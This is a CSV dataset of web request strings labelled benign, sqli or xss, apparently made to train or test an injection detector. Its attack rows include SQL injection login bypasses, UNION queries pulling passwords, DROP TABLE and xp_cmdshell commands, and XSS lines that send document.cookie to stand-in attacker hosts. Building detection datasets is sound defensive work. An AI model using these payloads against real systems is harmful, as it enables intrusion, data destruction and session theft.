payload,label
ref=shoes&page=8847&user_id=5355,benign
' OR 'a'='a,sqli
price_min=1545&coupon=phone&q=invoice,benign
' OR 1=1 --,sqli
offset=1154&name=citra&page=1659,benign
<script>new Image().src='http://c2.example/?c='+document.cookie;</script>,xss
<input onfocus=alert(1) autofocus>,xss
' GROUP BY password HAVING 1=1 --,sqli
ref=phone,benign
format=json&limit=6506&name=alice,benign
<video><source onerror=alert(1)></video>,xss
q=alice,benign
view=grid&offset=8503&price_min=2974,benign
<div onmouseover=alert(1)>hover</div>,xss
ref=shoes&limit=6350&name=shoes,benign
id=4315&format=json&view=grid,benign
<img src=x onerror=alert(1)>,xss
1' AND 1=1 --,sqli
qty=5382&price_max=34,benign
<video><source onerror=alert(1)></video>,xss
<svg onload=alert(1)>,xss
price_min=1642&redirect=/home&qty=5634,benign
1' AND 2=3 --,sqli
price_max=440&callback=foxtrot&user_id=3091,benign
page=158&theme=dark&lang=id,benign
<marquee onstart=alert(1)>,xss
<div onmouseover=alert(1)>hover</div>,xss
' OR 'a'='a,sqli
qty=3510,benign
"<a href=""javascript:alert(1)"">click</a>",xss
qty=2003&city=shoes&lang=en,benign
<input onfocus=alert(1) autofocus>,xss
<script>fetch('http://evil.example/steal?c='+document.cookie)</script>,xss
page=928,benign
<script>alert('xss')</script>,xss
currency=usd&lang=en,benign
<video><source onerror=alert(1)></video>,xss
email=phone@example.com&qty=1525,benign
token=ebf071,benign
token=1d35f56&format=json,benign
category=camera&price_max=6959,benign
search=dashboard&redirect=/home,benign
admin' --,sqli
<video><source onerror=alert(1)></video>,xss
1 OR 1=1,sqli
price_min=6210&price_max=8099,benign
<body onload=alert('xss')>,xss
page=4337&offset=1138,benign
city=shoes,benign
' AND (SELECT COUNT(*) FROM users) > 0 --,sqli
'><script>alert(1)</script>,xss
<script>eval(atob('YWxlcnQoMSk='))</script>,xss
price_max=4035&callback=dashboard&name=book,benign
token=332a17f&redirect=/home&size=m,benign
name=echo&coupon=budi&sort=desc,benign
"' UNION SELECT username, password FROM users --",sqli
<style>@import 'http://evil.example/xss.css';</style>,xss
<script>eval(atob('YWxlcnQoMSk='))</script>,xss
1 OR 1=1,sqli
<details open ontoggle=alert(1)>,xss
search=foxtrot&view=grid&size=m,benign
lang=id&ref=alice,benign
"' UNION SELECT NULL, NULL, NULL --",sqli
theme=dark,benign
<svg onload=alert(1)>,xss
"' UNION SELECT NULL, NULL, NULL --",sqli
limit=8500&name=budget,benign
id=7584&sort=desc&callback=settings,benign
theme=dark&callback=delta,benign
token=404b88a,benign
ref=shoes&redirect=/home&price_min=7735,benign
sort=asc&qty=437,benign
id=7075&sort=desc,benign
""" UNION SELECT table_name FROM information_schema.tables --",sqli
id=5322&qty=7539,benign
1' AND 1=1 --,sqli
view=grid&size=m,benign
token=4fc0234&theme=dark,benign
price_min=6952&user_id=4950,benign
' OR 1=1#,sqli
size=m&q=budi&tab=delta,benign
lang=en&city=jakarta,benign
' OR EXISTS(SELECT * FROM users) --,sqli
' HAVING 3=7 --,sqli
name=book&tab=camera,benign
limit=3505&price_min=4163&city=report,benign
<img src=x onerror=alert(1)>,xss
city=invoice&ref=orders,benign
color=shoes&search=profile,benign
<iframe src=javascript:alert(1)>,xss
admin' --,sqli
callback=surakarta,benign
' OR SLEEP(9)='0,sqli
name=profile,benign
' AND (SELECT COUNT(*) FROM users) > 0 --,sqli
<input onfocus=alert(1) autofocus>,xss
qty=4396&price_max=5616,benign
id=2371&offset=4107&theme=dark,benign
<marquee onstart=alert(1)>,xss
<img src=x onerror=this.src='http://c2.example/'+document.cookie>,xss
' AND (SELECT COUNT(*) FROM users) > 0 --,sqli
' OR 'a'='a,sqli
q=invoice&token=4e56c92,benign
""" OR ""1""=""1",sqli
coupon=echo&token=59073ac,benign
<script>alert('xss')</script>,xss
'; DROP TABLE users; --,sqli
<div onmouseover=alert(1)>hover</div>,xss
' OR 1=1#,sqli
user_id=7171,benign
"<a href=""javascript:alert(1)"">click</a>",xss
""" OR ""1""=""1",sqli
' OR EXISTS(SELECT * FROM users) --,sqli
coupon=foxtrot,benign
' OR 'a'='a,sqli
<iframe src=javascript:alert(1)>,xss
currency=usd&lang=id,benign
category=foxtrot&format=json&ref=shoes,benign
""" OR ""1""=""1",sqli
"' UNION SELECT username, password FROM users --",sqli
id=7861,benign
<iframe src=javascript:alert(1)>,xss
qty=7470&user_id=8588,benign
view=grid&category=alice&redirect=/home,benign
' OR SLEEP(2)='0,sqli
price_max=126&page=3461,benign
tab=dashboard,benign
sort=desc,benign
city=delta&format=json&coupon=orders,benign
page=8751&search=book,benign
"' UNION SELECT username, password FROM users --",sqli
' OR '1'='1,sqli
sort=desc&name=shoes,benign
format=json&coupon=foxtrot,benign
'><script>alert(1)</script>,xss
<svg onload=alert(1)>,xss
<img src=x onerror=this.src='http://evil.example/'+document.cookie>,xss
sort=asc&color=jakarta,benign
user_id=3451&price_max=4326,benign
qty=9400&q=shoes&coupon=shoes,benign
color=laptop,benign
callback=echo&lang=id&price_min=6115,benign
<body onload=alert('xss')>,xss
<script>eval(atob('YWxlcnQoMSk='))</script>,xss
' OR SLEEP(3)='0,sqli
"<a href=""javascript:alert(1)"">click</a>",xss
format=json&id=5061&limit=3991,benign
token=54b75fe&lang=id,benign
token=36b5129&qty=798&limit=8109,benign
callback=laptop,benign
qty=8648&callback=budget&price_max=1997,benign
<script>fetch('http://evil.example/steal?c='+document.cookie)</script>,xss
' AND (SELECT COUNT(*) FROM users) > 0 --,sqli
name=laptop,benign
limit=3329,benign
offset=5890&view=grid,benign
<img src=x onerror=this.src='http://evil.example/'+document.cookie>,xss
<script>alert(document.cookie)</script>,xss
city=dashboard&id=3682,benign
session=1ff2143&price_min=1294&size=m,benign
""" UNION SELECT table_name FROM information_schema.tables --",sqli
city=invoice&coupon=camera,benign
coupon=book&email=camera@example.com&sort=asc,benign
callback=budget&color=dashboard&ref=citra,benign
<iframe src=javascript:alert(1)>,xss
"<a href=""javascript:alert(1)"">click</a>",xss
tab=budget&coupon=dashboard&format=json,benign
' GROUP BY password HAVING 1=1 --,sqli
' OR 6=7 --,sqli
color=profile,benign
session=5cce421,benign
<script>alert('xss')</script>,xss
token=5b4fc9a,benign
<script>fetch('http://evil.example/steal?c='+document.cookie)</script>,xss
<body onload=alert('xss')>,xss
<svg onload=alert(1)>,xss
""" OR ""1""=""1",sqli
"' UNION SELECT NULL, NULL, NULL --",sqli
category=echo&price_max=8667&page=9909,benign
'><script>alert(1)</script>,xss
search=budget&lang=en&theme=dark,benign
<script>document.location='http://attacker.test/'+document.cookie</script>,xss
user_id=9211&offset=6528,benign
' OR SLEEP(7)='0,sqli
limit=9251&q=surakarta,benign
token=1fc8533&search=camera,benign
sort=asc&email=alice@example.com&token=f16644,benign
<svg onload=alert(1)>,xss
qty=9452&price_max=8822&category=orders,benign
search=echo&qty=5731,benign
price_max=1076&lang=id,benign
admin' --,sqli
limit=9782,benign
') OR ('1'='1,sqli
"' UNION SELECT NULL, NULL, NULL --",sqli
"<a href=""javascript:alert(1)"">click</a>",xss
coupon=budget&lang=en,benign
'; DROP TABLE users; --,sqli
<script>alert('xss')</script>,xss
name=book,benign
' OR 'a'='a,sqli
admin' --,sqli
admin' --,sqli
1; EXEC xp_cmdshell('dir') --,sqli
<input onfocus=alert(1) autofocus>,xss
<script>alert(document.cookie)</script>,xss
price_max=1169&price_min=5630&ref=settings,benign
city=budget,benign
lang=id&tab=surakarta,benign
session=31b7cb4&sort=asc,benign
currency=usd&name=orders,benign
"<a href=""javascript:alert(1)"">click</a>",xss
id=377,benign
token=5b74eb1,benign
session=2406815&search=echo&price_max=8721,benign
callback=alice&city=camera&limit=1011,benign
<body onload=alert('xss')>,xss
' OR EXISTS(SELECT * FROM users) --,sqli
1' AND SLEEP(5) --,sqli
' OR SLEEP(5)='0,sqli
<script>alert(document.cookie)</script>,xss
redirect=/home&view=grid&price_max=4478,benign
page=9775&sort=desc,benign
page=137&token=1758caf,benign
sort=asc&page=3520,benign
qty=4948&lang=en,benign
sort=asc&city=report,benign
"""><script>alert(1)</script>",xss
<marquee onstart=alert(1)>,xss
1' AND 1=1 --,sqli
' OR 1=7#,sqli
user_id=8692&category=camera,benign
tab=jakarta,benign
search=book&user_id=1782,benign
coupon=camera,benign
email=shoes@example.com&price_min=4781&search=budi,benign
page=3947,benign
' OR 4=2#,sqli
' OR EXISTS(SELECT * FROM users) --,sqli
<img src=x onerror=this.src='http://attacker.test/'+document.cookie>,xss
<img src=x onerror=alert(1)>,xss
email=camera@example.com,benign
<video><source onerror=alert(1)></video>,xss
limit=1321&user_id=6641&size=m,benign
1' AND 1=1 --,sqli
category=jakarta&token=568aa45&email=camera@example.com,benign
price_max=508&currency=usd&email=shoes@example.com,benign
<marquee onstart=alert(1)>,xss
<img src=x onerror=alert(1)>,xss
"""><script>alert(1)</script>",xss
"' UNION SELECT username, password FROM users --",sqli
<script>document.location='http://evil.example/'+document.cookie</script>,xss
offset=1023,benign
ref=settings,benign
redirect=/home&search=foxtrot&name=invoice,benign
' OR 1=1#,sqli
<div onmouseover=alert(1)>hover</div>,xss
lang=id&session=c5b808,benign
1' AND SLEEP(5) --,sqli
callback=alice&offset=5363&format=json,benign
<img src=x onerror=alert(1)>,xss
theme=dark&coupon=book&email=citra@example.com,benign
ref=camera&format=json,benign
